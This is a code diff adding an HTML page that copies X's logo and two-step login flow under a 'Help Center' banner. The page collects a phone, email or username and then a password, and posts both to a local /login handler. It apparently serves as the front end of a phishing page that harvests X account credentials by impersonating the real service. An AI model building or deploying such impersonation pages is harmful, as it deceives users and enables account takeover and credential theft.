@@ -1,0 +1,301 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Help Center / Login</title>
+    <style>
+        /* Modified classification label styles */
+        .input-container {
+            position: relative;
+            margin: 8px 0;
+        }
+        
+     /* Modified disabled input styling */
+input[type="text"]:disabled {
+    background-color: #000000 !important;
+    color: #ffffff !important;
+    opacity: 1;
+    -webkit-text-fill-color: #131111 !important;
+}
+
+/* Keep existing classification label positioning */
+.classification-label {
+    position: absolute;
+    top: -10px; /* Adjust this to position the label above the input */
+    left: 8px;
+    font-size: 12px;
+    color: #1d9bf0; /* Change this to a color that contrasts with the background */
+    pointer-events: none;
+    display: none; /* Initially hidden */
+}
+
+
+        /* Added disabled input styling */
+        input:disabled {
+            background-color: #000000 !important;
+            color: #ffffff !important;
+        }
+
+        /* Original unchanged styles below */
+        body {
+            font-family: "Helvetica Neue", Arial, sans-serif;
+            background: linear-gradient(to bottom, #222222 25%, #000000 25%);
+            color: #333333;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            flex-direction: column;
+        }
+    
+        .logo-container {
+            width: 100%;
+            text-align: center;
+            position: absolute;
+            top: 5%;
+            left: 50%;
+            transform: translateX(-50%);
+        }
+        .logo {
+            width: 80px;
+        }
+        .help-center-text {
+            font-size: 3rem;
+            color: #000000;
+            font-weight: bold;
+            margin-top: 10px;
+        }
+        .login-box {
+            background-color: #111111;
+            padding: 2rem;
+            border-radius: 10px;
+            width: 350px;
+            text-align: center;
+            position: absolute;
+            top: 30%;
+        }
+        .login-box h2 {
+            color: #ffffff;
+            margin-bottom: 1.5rem;
+            font-size: 1.5rem;
+            font-weight: bold;
+        }
+        
+        input[type="text"], input[type="password"] {
+            width: 100%;
+            padding: 12px;
+            margin: 8px 0;
+            border: 1px solid #ccd6dd;
+            border-radius: 5px;
+            background-color: #000000;
+            color: #ffffff;
+            box-sizing: border-box;
+        }
+
+        input[type="text"]:focus {
+            background-color: #000000 !important;
+            color: #ffffff !important;
+            border-color: #1d9bf0;
+            outline: none;
+        }
+
+        .password-container {
+            position: relative;
+        }
+        .eye-icon {
+            position: absolute;
+            right: 10px;
+            top: 50%;
+            transform: translateY(-50%);
+            cursor: pointer;
+            width: 24px;
+            height: 24px;
+            filter: invert(100%) brightness(100%);
+        }
+        input[type="password"] {
+            padding-right: 40px;
+        }
+        input[type="submit"] {
+            width: 100%;
+            padding: 12px;
+            margin-top: 1rem;
+            background-color: rgb(255, 250, 250);
+            color: rgb(10, 9, 9);
+            border: 1px solid #ccd6dd;
+            border-radius: 20px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+        input[type="submit"]:hover {
+            background-color: #f0f0f0;
+        }
+        .footer-links {
+            margin-top: 1rem;
+            font-size: 0.9rem;
+        }
+        a {
+            color: #1d9bf0;
+            text-decoration: none;
+        }
+        a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <div class="logo-container">
+        <svg viewBox="0 0 1200 1227" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" role="none" class="logo">
+            <path d="M714.163 519.284L1160.89 0H1055.03L667.137 450.887L357.328 0H0L468.492 681.821L0 1226.37H105.866L515.491 750.218L842.672 1226.37H1200L714.137 519.284H714.163ZM569.165 687.828L521.697 619.934L144.011 79.6944H306.615L611.412 515.685L658.88 583.579L1055.08 1150.3H892.476L569.165 687.854V687.828Z"></path>
+        </svg>
+        <span class="help-center-text">Help Center</span>
+    </div>
+
+    <div class="login-box">
+        <h2 id="loginText">Login to X</h2>
+        <form id="loginForm" action="/login" method="POST">
+            <div class="input-container">
+                <input type="text" id="username" name="email" placeholder="Phone, Email, or username" required>
+            </div>
+
+            <div class="password-container" id="passwordBox" style="display: none;">
+                <input type="password" name="password" id="password" placeholder="Password" required>
+                <img id="eye-icon" class="eye-icon" src="images/hpassword.svg" alt="Toggle password visibility" />
+            </div>
+
+            <input type="submit" id="submitBtn" value="Next">
+        </form>
+
+       
+    </div>
+</div>
+<script>
+    const submitBtn = document.getElementById('submitBtn');
+    const usernameInput = document.getElementById('username');
+    const passwordBox = document.getElementById('passwordBox');
+    const form = document.getElementById('loginForm');
+    const loginText = document.getElementById('loginText');
+    const passwordField = document.getElementById('password');
+    const eyeIcon = document.getElementById('eye-icon');
+
+
+
+    // Flag to track if we're showing the password box
+    let isPasswordBoxVisible = false;
+
+    // Submit button click handler
+    submitBtn.addEventListener('click', function(event) {
+        if (!isPasswordBoxVisible) {
+            // Prevent form submission on first click
+            event.preventDefault();
+            if (!usernameInput.value.trim()) {
+            const errorMessage = document.createElement('div');
+            errorMessage.id = 'usernameError';
+            errorMessage.textContent = 'Please enter your phone, email, or username.';
+            errorMessage.style.color = '#e0245e';
+            errorMessage.style.fontSize = '12px';
+            errorMessage.style.marginTop = '4px';
+            errorMessage.style.textAlign = 'left';
+            errorMessage.style.paddingLeft = '8px';
+            usernameInput.parentElement.appendChild(errorMessage);
+            // Hide the error message after 2 seconds
+            setTimeout(function() {
+                    errorMessage.remove(); // Remove error message after 2 seconds
+                }, 2000); // 2000 milliseconds = 2 seconds
+            
+            return;
+        }
+
+            // Show password box and change the button text
+        
+            passwordBox.style.display = 'block';
+            loginText.textContent = 'Enter your password';
+            submitBtn.value = 'Log in';
+           
+
+
+            // Set flag to indicate password box is now visible
+            isPasswordBoxVisible = true;
+        }
+          // Make the username input readonly after the password box appears
+          usernameInput.setAttribute('readonly', true);
+    });
+
+    // If the password box is visible, form will submit normally
+    form.addEventListener('submit', function(event) {
+        if (isPasswordBoxVisible) {
+            // Allow form submission if password box is visible
+            return;
+        } else {
+            event.preventDefault(); // Prevent form submission if password box isn't shown yet
+        }
+        
+    });
+    eyeIcon.addEventListener('click', function() {
+    const isPasswordVisible = passwordField.type === 'text';
+    passwordField.type = isPasswordVisible ? 'password' : 'text';
+    eyeIcon.src = isPasswordVisible 
+        ? 'images/hpassword.svg'
+        : 'images/spassword.svg';
+});
+// Classification logic for username input
+submitBtn.addEventListener('click', function(event) {
+  
+
+
+
+// Function to show the error message under username input
+function showError(message) {
+    let errorMessage = document.getElementById('usernameError');
+    if (!errorMessage) {
+        errorMessage = document.createElement('div');
+        errorMessage.id = 'usernameError';
+        errorMessage.style.color = 'red';
+        errorMessage.style.fontSize = '12px';
+        errorMessage.style.marginTop = '5px';
+        usernameInput.parentElement.appendChild(errorMessage);
+    }
+}
+
+
+    // Prevent form submission on first click
+    if (!isPasswordBoxVisible) {
+        event.preventDefault();
+    }
+    const value = usernameInput.value.trim();
+    let type = '';
+
+    if (!value) {
+        // If the username field is empty, don't classify as username
+        return;
+    }
+    if (/^\+?\d+$/.test(value)) {
+        type = 'Phone';
+    } 
+    // Check if input contains '@' and structure it like an email
+      // Check if input contains both '@' and '.' to classify as email
+      else if (/@.*\./.test(value)) {
+        type = 'Email';
+    } 
+    // Default to username if neither
+    else {
+        type = 'Username';
+    }
+    const container = usernameInput.parentElement;
+    const existingLabel = container.querySelector('.classification-label');
+    if (existingLabel) existingLabel.remove();
+
+    const label = document.createElement('div');
+    label.className = 'classification-label';
+    label.textContent = type;
+    container.appendChild(label);
+    label.style.display = 'block';
+
+    // Make the username input readonly after clicking "Next"
+    
+});
+
+   
+            </script>
+            </body>
+            </html>
